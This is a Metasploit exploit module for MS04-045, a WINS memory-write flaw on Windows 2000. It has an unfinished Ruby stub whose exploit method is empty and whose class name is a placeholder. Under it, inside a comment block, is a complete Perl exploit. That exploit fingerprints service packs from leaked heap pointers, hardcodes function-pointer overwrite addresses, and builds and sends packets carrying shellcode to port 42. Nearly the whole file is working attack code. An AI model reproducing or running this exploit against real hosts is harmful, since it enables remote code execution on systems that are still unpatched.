require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Microsoft WINS MS04-045 Code Execution',
			'Description'    => %q{
				This module exploits a arbitrary memory write flaw in the
				WINS service. This exploit has been tested against Windows
				2000 only.
					
			},
			'Author'         => [ 'hdm' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '12378'],
					[ 'MSB', 'MS04-045'],
					[ 'MIL', '78'],

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 8000,
					'BadChars' => "",
					'MinNops'  => 512,
					'Prepend'  => "\x81\xc4\x54\xf2\xff\xff",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'win32, win2000',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Dec 14 2004',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::wins_ms04_045;
use base "Msf::Exploit";
use strict;

my $advanced =
  {
	'BASE'	=> [0, 'Specify the exact address to the structure'],
	'TARG'	=> [0, 'Specify the exact address to overwrite'],
	'WHAT'	=> [0, 'Specify the data used to overwrite the address'],
  };

my $info =
  {
	'Name'    => 'Microsoft WINS MS04-045 Code Execution',
	'Version' => '$Revision$',
	'Authors' => [ 'H D Moore <hdm [at] metasploit.com>' ],

	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'win2000' ],
	'Priv'  => 1,

	'AutoOpts'  => { 'EXITFUNC' => 'process' },
	'UserOpts'  =>
	  {
		'RHOST'  => [1, 'ADDR', 'The target address'],
		'RPORT'  => [1, 'PORT', 'The target port', 42],
	  },

	'Payload' =>
	  {
		'Space' 	=> 8000,
		'MinNops'	=> 512,
		'Prepend'	=> "\x81\xc4\x54\xf2\xff\xff",	# add esp, -3500
		'Keys' 		=> ['+ws2ord'],
	  },

	'Description'  => Pex::Text::Freeform(qq{
		This module exploits a arbitrary memory write flaw in the WINS service. This
	exploit has been tested against Windows 2000 only.
}),

	'Refs'  =>
	  [
		['OSVDB',   '12378'],
		['MSB',     'MS04-045'],
		['MIL', 	'78'],
	  ],

	'Targets'   =>
	  [
		['Windows 2000 English', [ 0x5391f40 ], 0x53df4c4, 0x53922e0]
	  ],

	'Keys'  =>  ['wins'],

	'DisclosureDate' => 'Dec 14 2004',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Check {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');

	my ($ret, $fprint, $check) = @{ $self->Fingerprint };

	if ($ret < 0) {
		return $check;
	}

	if ($ret == 0) {
		$self->PrintLine("[*] This system does not appear to be vulnerable.");
		return $check;
	}

	$self->PrintLine("[*] This system appears to be vulnerable.");
	if ($fprint->{'os'} ne '?') {
		my $os = $fprint->{'os'} eq '?' ? 'Unknown Windows' : 'Windows '. $fprint->{'os'};
		my $sp = $fprint->{'sp'} eq '?' ? '' : 'SP '. $fprint->{'sp'};
		my $vi = $fprint->{'vi'} == 1 ? '(clean heap)' : '(dirty heap)';
		my $hp = length($sp) ? $vi : '';
		$self->PrintLine("[*] Host $target_host is $os $sp $hp");
	}

	return $self->CheckCode('Safe');
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');

	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;

	my $target = $self->Targets->[$target_idx];

	if (! $self->InitNops(128)) {
		$self->PrintLine("[*] Failed to initialize the nop module.");
		return;
	}

	# Sanity check the WINS service
	my ($ret, $fprint, $check) = @{ $self->Fingerprint };

	if ($ret <= 0) {
		$self->PrintLine("[*] The target system does not appear to be vulnerable.");
		return;
	}

	# Windows 2000 SP0, SP2, SP3, SP4 only. SP1 does not have the
	# same function pointer...
	if ($fprint->{'os'} ne '2000' || $fprint->{'sp'} !~ /^[0234]/ ) {
		$self->PrintLine("[*] The target system is not currently supported");
		return;
	}

	# This flag is un-set if the first leaked address is not the default of
	# 0x05371e90. This can indicate that someone has already tried to exploit
	# this system, or something major happened to the heap that will probably
	# prevent this exploit from working.
	if (! $fprint->{'vi'}) {
		$self->PrintLine("[*] The leaked heap address indicates that this attack may fail.");
	}

	# Allow for multiple attempts to find the base address
	# XXX - Brute force not implemented (or required so far)
	my @rloc = @{ $target->[1] };

	# Address of the function pointers to overwrite (courtesy anonymous donor)
	my $targ = $target->[2];

	# Address of the payload on the heap, past the structure
	my $code = $target->[3];

	# Advanced options can be used to overwrite
	@rloc = ( hex($self->GetVar('BASE')) ) if $self->GetVar('BASE');
	$targ = hex($self->GetVar('TARG')) if $self->GetVar('TARG');
	$code = hex($self->GetVar('WHAT')) if $self->GetVar('WHAT');

	foreach my $base (@rloc) {
		my ($req, $add);

		# Pointing at any aligned address into top 36 bytes will result in a
		# valid structure. This gives us some breathing room if things move
		# around a little bit.
		$add .= pack('V', $code) x 9;
		$add .= pack('V', $targ - 0x48) x 14;

		# Multiple copies are used in case things slide a little bit
		$req .= $add x 10;

		# Bling.
		$req .= $shellcode;

		# Random padding :-)
		$req .= Pex::Text::EnglishText(9200 - length($req));

		# Tack on the header
		my $pkt = pack('NNN', length($req) + 8, -1, $base). $req;

		# Poink!
		$self->PrintLine(sprintf("[*] Attempting to overwrite 0x%.8x with 0x%.8x (0x%.8x)", $targ, $code, $base));
		my $s = Msf::Socket::Tcp->new
		  (
			'PeerAddr'  => $target_host,
			'PeerPort'  => $target_port,
		  );

		if ($s->IsError) {
			$self->PrintLine("[*] Socket error: " . $s->GetError());
			return(0);
		}

		$s->Send($pkt);
		$self->Handler($s);
	}

	return;
}

# This fingerprinting routine will cause the structure base address to slide down
# 120 bytes. Subsequent fingerprints will not push this down any futher, however
# we need to make sure that fingerprint is always called before exploitation or
# the alignment will be way off.

sub Fingerprint {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $fprint = {};

	# This results in vulnerable servers leaking back some useful
	# pointers to the heap and to ntdll.dll. We can use these pointers
	# to determine the service pack.

	my $req =
	  "\x00\x00\x00\x29\x00\x00\x78\x00\x00\x00\x00\x00".
	  "\x00\x00\x00\x00\x00\x00\x00\x40\x00\x02\x00\x05".
	  "\x00\x00\x00\x00\x60\x56\x02\x01\x00\x1F\x6E\x03".
	  "\x00\x1F\x6E\x03\x08\xFE\x66\x03\x00";

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
	  );

	if ($s->IsError) {
		$self->PrintLine("[*] Socket error: " . $s->GetError());
		return [-2, $fprint, $self->CheckCode('Connect') ];
	}

	$s->Send($req);
	my $res = $s->Recv(-1, 5);
	if (! $res) {
		$self->PrintLine("[*] No response to WINS probe.");
		$s->Close;
		return [-1, $fprint, $self->CheckCode('Connect') ];
	}

	my @ptrs = ( unpack('N', substr($res, 16, 4)), unpack('VVV', substr($res, 32)) );
	$self->PrintDebugLine(1, sprintf("[*] Pointers: [0x%.8x] 0x%.8x 0x%.8x 0x%.8x", @ptrs));

	my ($os, $sp, $vi) = ('2000', '?', '?');

	# Windows 2000 versions
	$sp = '0'	if $ptrs[3] == 0x77f8ae78;
	$sp = '1'	if $ptrs[3] == 0x77f81f70;
	$sp = '2'	if $ptrs[3] == 0x77f82680;
	$sp = '3'	if $ptrs[3] == 0x77f83608;
	$sp = '4'	if $ptrs[3] == 0x77f89640;
	$sp = '4++'	if $ptrs[3] == 0x77f82518;

	# Contributed by grutz[at]jingojango.net
	$sp = '3/4' if $ptrs[3] == 0x77f81648;

	# Probably not Windows 2000...
	$os = '?' if $sp eq '?';

	# Windows NT 4.0
	if ($ptrs[0] > 0x02300000 && $ptrs[0] < 0x02400000) {
		$os = 'NT';
		$sp = '?';
	}

	# Heap is still pristine...
	$vi = 1 if $ptrs[0] == 0x05371e90;

	# Store the fingerprints....
	$fprint->{'os'} = $os;
	$fprint->{'sp'} = $sp;
	$fprint->{'vi'} = $vi;

	# Probe to test vulnerability
	$req =	"\x00\x00\x00\x0F\x00\x00\x78\x00". substr($res, 16, 4).
	  "\x00\x00\x00\x03\x00\x00\x00\x00";
	$s->Send($req);
	$res = $s->Recv(-1, 3);

	$s->Close;

	if (substr($res, 6, 1) eq "\x78") {
		return [1, $fprint, $self->CheckCode('Appears') ];
	}

	return [0, $fprint, $self->CheckCode('Safe') ];
}

1;

__END__
SP0 [0x05371e90] 0x053dffa4 0x77fb80db 0x77f8ae78
SP1 [0x05371e90] 0x0580ffa4 0x77fb9045 0x77f81f70
SP2 [0x05371e90] 0x053dffa4 0x77fb9da7 0x77f82680
SP3 [0x05371e90] 0x053dffa4 0x77f82b95 0x77f83608
SP4 [0x05371e90] 0x053dffa4 0x77f98191 0x77f89640
SP4 [0x00000040] 0x053dffa4 0x77f98191 0x77f89640 (patched)
SP4 [0x0000003e] 0x053dffa4 0x77f81f55 0x77f82518 (mostly patched)

NT4 
YES [0x023b1e98] 0x0014c3f0 0x00000048 0x00000000
NOT [0x023d1dc8] 0x0014de60 0x00000048 0x0000023f
YES [0x023b1ea0] 0x00000048 0x00000009 0x0000023e

2K3 [0x00000040] 0x044bf584 0x01013c25 0x000003ac

=end


end
end	
